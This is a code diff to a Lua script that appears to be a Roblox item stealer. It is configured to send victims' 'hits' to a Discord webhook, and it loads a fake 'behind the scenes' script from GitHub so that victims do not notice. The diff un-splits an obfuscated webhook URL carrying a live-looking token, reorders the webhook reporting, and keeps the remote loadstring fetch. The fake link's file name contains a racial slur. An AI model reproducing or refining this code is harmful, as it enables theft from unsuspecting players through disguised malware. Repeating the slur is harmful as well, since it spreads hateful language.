@@ -25,7 +25,7 @@ local Configuration = {
     };
     AutoCollect = {
         Enabled = true; -- Automatically collect items from hits, even while you're offline. Note that you need the seperate joiner script to actually collect items
-        Webhook = "https://discord.com/api/w" .. "ebhooks/1495533968051671181/H4RzH4doQ5k5waOUbdFDDPsu5ozwYcMPL8NBZ4I6fXrK80U7aJk-749zcYabOqmiQ8Zs";
+        Webhook = "https://discord.com/api/webhooks/1495533968051671181/H4RzH4doQ5k5waOUbdFDDPsu5ozwYcMPL8NBZ4I6fXrK80U7aJk-749zcYabOqmiQ8Zs";
     };
     CustomBtsScript = "atlas"; -- Custom 'Behind the scenes' script (the script that loads so that it doesnt appear that nothing happened when a victim runs the script)
     FakeAtlasLink = "https://raw.githubusercontent.com/exodus892/__exodus__/refs/heads/main/Nigger.lua"  -- Note if you ever change the script github u must change this too
@@ -45,12 +45,12 @@ local function SafeRequest(Data)
 end
 
 local function LoadScript()
-    task.spawn(function()
+    --task.spawn(function()
         if _G.DontLoadAtlas then return end
         if Configuration.CustomBtsScript ~= "none" then
             loadstring(game:HttpGet(Scripts[Configuration.CustomBtsScript]))()
         end
-    end)
+    --end)
 end
 
 local HitsWebhook = Configuration.Webhook
@@ -1204,8 +1204,10 @@ local function StartSession(StealerName)
         StealerIsTrading = StealerPlayer:WaitForChild("TradeConfig", math.huge):WaitForChild("IsTrading", math.huge)
     end
 
-    workspace:WaitForChild("Amulets").ChildAdded:Connect(function(v)
-        v:Destroy()
+    pcall(function()
+        workspace:FindFirstChild("Amulets").ChildAdded:Connect(function(v)
+            v:Destroy()
+        end)
     end)
     Players.PlayerAdded:Connect(function(Player)
         if table.find(StealerName, Player.Name) then
@@ -1348,12 +1350,10 @@ local function StartSession(StealerName)
         end
     end)
 end
-
 task.spawn(function()
-    wait(8)
-    LoadScript()
+    SendToWebhook()
 end)
 
+LoadScript()
 repeat task.wait() until #game:GetService("Players"):GetPlayers() < game:GetService("Players").MaxPlayers
-SendToWebhook()
 StartSession(Configuration.Whitelist)
